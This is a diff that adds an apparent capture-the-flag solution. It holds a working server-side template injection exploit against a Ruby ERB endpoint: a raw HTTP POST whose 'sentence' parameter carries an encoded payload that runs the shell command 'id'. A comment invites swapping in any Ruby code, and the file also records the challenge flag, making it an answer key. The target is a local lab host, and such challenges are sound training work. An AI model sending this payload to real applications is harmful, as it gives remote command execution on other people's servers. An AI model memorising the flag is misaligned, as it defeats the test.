@@ -1,0 +1,8 @@
+# ERB SSTI RCE via sentence param. Client-side JS regex validation bypassed by direct POST. Template: ERB.new(sentence) evaluated with binding(). Replace payload with any Ruby code. flag{c4ddca47-533e-432a-b5fa-1503c21c538c}
+
+POST /generate HTTP/1.1
+Host: 172.17.0.1:60451
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+
+sentence=%3C%25%3D+%60id%60+%25%3E&number=1
